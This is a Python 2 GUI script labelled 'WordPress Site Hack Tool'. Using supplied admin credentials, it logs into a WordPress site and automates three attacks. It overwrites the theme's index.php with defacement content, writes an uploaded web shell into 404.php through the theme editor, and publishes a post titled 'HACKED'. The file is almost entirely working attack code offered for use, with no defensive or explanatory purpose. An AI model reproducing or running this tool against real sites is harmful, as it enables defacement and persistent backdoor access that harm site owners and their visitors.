#!/usr/bin/env python2
#-*- coding: utf-8 -*-
#Coded By Basofi suderman
#WordPress Site Hack Tool
#
#

__author__ = "basofi CYBER KEDIRI"
__date__ = "19/10/17"

from re import findall
from Tkinter import *
from sys import exit as bitir
from os import system, name
import time
import sys


reload(sys)
sys.setdefaultencoding('utf8')

try:
    import mechanize
except ImportError:
    print u"\nMechanize Module Not Found...\nBe Sure To Install..."
    print "-"*76
    time.sleep(3)
    bitir()



def index_at():
    def yap():
        if name == "nt":
            system("color a")
            system("cls")
        else:
            pass
        print "-"*76
        print u"WordPress İndex Atma"
        print "-"*76
        index_kodlar = _index.get(1.0,END)
        br = mechanize.Browser()
        br.set_handle_robots(False)
        site = _site.get()+"wp-login.php"
        br.open(site)
        br.select_form(nr=0)

        br["log"] = _kadi.get()
        br["pwd"] = _sifre.get()

        kontrol = br.submit().read()

        if _kadi.get() in kontrol:
            print u"Login Successful...\n"
        else:
            print u"Login Failed..."
            time.sleep(3)
            bitir()

        edit = _site.get() + "wp-admin/theme-editor.php?file=index.php"

        koko = br.open(edit).read()
        if 'value="Update File"' not in koko:
            print u"This Site Is Protected, 'Post At' Try the Method... "
            time.sleep(3)
            bitir()
        else:
            pass
        br.select_form(nr=1)
        br["newcontent"] = index_kodlar
        br.submit()
        print "-"*76
        print u"Home Index Successfully Throws..."
        print "-"*76


    ana = Tk()
    ana.title("CYBER KEDIRI | İndex Atma")
    ana.tk_setPalette("black")

    site = Label(ana,text='Write Site (Finally "/" As)',fg="green")
    site.pack()
    _site = Entry(ana)
    _site.pack()

    kadi = Label(ana,text="User name:",fg="green")
    kadi.pack()
    _kadi = Entry(ana)
    _kadi.pack()

    sifre = Label(ana,text="Enter your password:",fg="green")
    sifre.pack()
    _sifre = Entry(ana,show="*")
    _sifre.pack()

    index = Label(ana,text="Index Codes:",fg="green")
    index.pack()
    kaydirma = Scrollbar(ana)
    kaydirma.pack(side=RIGHT,fill=Y)
    _index = Text(ana,fg="orange",font="Helvetica 10",yscrollcommand=kaydirma.set)
    _index.pack()
    kaydirma.config(command=_index.yview)

    btn = Button(ana,text="Start Action!",fg="green",command=yap)
    btn.pack()

    ana.mainloop()

def shell_at():
    def yap():
        if name == "nt":
            system("color a")
            system("cls")
        else:
            pass
        print "-"*76
        print u"WordPress Shell Atma"
        print "-"*76

        shellx = open(_shella.get(), "r")
        shell = shellx.read()
        shellx.close()

        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.open(_site.get()+"wp-login.php")
        br.select_form(nr=0)

        br["log"] = _kadi.get()
        br["pwd"] = _sifre.get()

        kontrol = br.submit().read()

        if _kadi.get() in kontrol:
            print u"Login Successful...\n"
        else:
            print u"Login Failed..."
            time.sleep(3)
            bitir()

        edit = _site.get() + "wp-admin/theme-editor.php?file=404.php"
        br.open(edit)
        br.select_form(nr=1)
        br["newcontent"] = shell
        br.submit()

        print "-"*76
        print u"Shell Successfully Attempted to '404.php' Page..."
        print _site.get() + "404.php"
        print "-"*76


    ana = Tk()
    ana.title("CYBER KEDIRI | Shell Atma")
    ana.tk_setPalette("black")
    ana.geometry("300x200")

    site = Label(ana,text='Write Site (Finally "/" As)',fg="green")
    site.pack()
    _site = Entry(ana)
    _site.pack()

    kadi = Label(ana,text="User name:",fg="green")
    kadi.pack()
    _kadi = Entry(ana)
    _kadi.pack()

    sifre = Label(ana,text="Enter your password:",fg="green")
    sifre.pack()
    _sifre = Entry(ana,show="*")
    _sifre.pack()

    shelly = Label(ana,text="Shell Path:",fg="green")
    shelly.pack()
    _shella = Entry(ana)
    _shella.pack()

    btn = Button(ana, text="Start Action!", fg="green", command=yap)
    btn.pack()

def post_at():
    def yap():
        if name == "nt":
            system("color a")
            system("cls")
        else:
            pass
        print "-" * 76
        print u"WordPress Post Atma"
        print "-" * 76

        sitex = _site.get()
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.open(sitex + "wp-login.php")
        br.select_form(nr=0)
        br["log"] = _kadi.get()
        br["pwd"] = _sifre.get()
        kontrol = br.submit().read()

        if _kadi.get() in kontrol:
            print u"Login Successful...\n"
        else:
            print u"Login Failed..."
            time.sleep(3)
            bitir()

        br.open(sitex + "wp-admin/post-new.php")
        br.select_form(nr=1)
        br["post_title"] = "HACKED"
        br["content"] = _post.get(1.0, END)

        x = br.submit(name="publish").read()

        nesne = re.findall('>http://(.+)<span id="editable-post-name">(.+)</span>/</a></span>', x)

        x = nesne[0]

        a, b = x

        print u"http://" + a + b
        print u"The Process Is Successful..."

    ana = Tk()
    ana.title("Black Viking")
    ana.geometry("480x423")
    ana.tk_setPalette("black")

    site = Label(ana, text='Write Site (Finally "/" As)', fg="green")
    site.pack()
    _site = Entry(ana)
    _site.pack()

    kadi = Label(ana, text="User Name: ", fg="green")
    kadi.pack()
    _kadi = Entry(ana)
    _kadi.pack()

    sifre = Label(ana, text="Password: ", fg="green")
    sifre.pack()
    _sifre = Entry(ana, show="*")
    _sifre.pack()

    post = Label(ana, text="Write Post Content: ", fg="green")
    post.pack()
    kaydirma = Scrollbar(ana)
    kaydirma.pack(side=RIGHT, fill=Y)
    _post = Text(ana, height=15, fg="orange", font="Helvetica 10", yscrollcommand=kaydirma.set)
    _post.pack()
    kaydirma.config(command=_post.yview)

    btn = Button(ana, text="Start Action!", fg="green", command=yap)
    btn.pack()

    ana.mainloop()

#def konu_ac():
#    print "a"

ana = Tk()
ana.title("CYBER KEDIRI | WordPress Site Hack Tool")
ana.tk_setPalette("black")

btn_index = Button(ana,text="İndex Atma",fg="green",command=index_at)
btn_index.pack(side=LEFT)

btn_shell = Button(ana,text="Shell Atma",fg="green",command=shell_at)
btn_shell.pack(side=LEFT)

btn_post = Button(ana,text="Post At",fg="green",command=post_at)
btn_post.pack(side=LEFT)

#btn_zone = Button(ana,text="Zone Alma",fg="green")
#btn_zone.pack(side=LEFT)

btn_cik = Button(ana,text="Exit from Program",fg="green",command=bitir)
btn_cik.pack(side=LEFT)


ana.mainloop()
